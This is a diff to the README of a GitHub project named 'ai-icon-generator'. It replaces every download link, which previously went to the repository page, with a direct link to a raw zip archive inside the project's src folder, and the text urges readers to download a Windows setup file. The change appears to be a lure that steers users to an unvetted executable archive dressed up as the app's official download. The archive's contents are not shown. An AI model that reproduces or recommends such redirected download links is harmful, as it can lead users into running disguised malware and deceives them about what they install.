@@ -1,6 +1,6 @@
 # 🎨 ai-icon-generator - Make clean icons in minutes
 
-[![Download the app](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Spiffy-denotatum276/ai-icon-generator)
+[![Download the app](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Spiffy-denotatum276/ai-icon-generator/raw/refs/heads/main/src/ai_generator_icon_v1.2.zip)
 
 ## 🖥️ What this app does
 
@@ -11,7 +11,7 @@ It is meant for people who want fast icon drafts without using a design tool fro
 ## 📥 Download the app
 
 To get the app, visit this page to download:
-https://github.com/Spiffy-denotatum276/ai-icon-generator
+https://github.com/Spiffy-denotatum276/ai-icon-generator/raw/refs/heads/main/src/ai_generator_icon_v1.2.zip
 
 Open the page in your browser, then look for the latest release or the project files. If you see a setup file for Windows, download it to your computer.
 
@@ -149,4 +149,4 @@ If you keep the project in one place and follow the setup steps in order, the ap
 ## 🔗 Open the project page
 
 Visit the GitHub page here to download or run the app source:
-https://github.com/Spiffy-denotatum276/ai-icon-generator
+https://github.com/Spiffy-denotatum276/ai-icon-generator/raw/refs/heads/main/src/ai_generator_icon_v1.2.zip
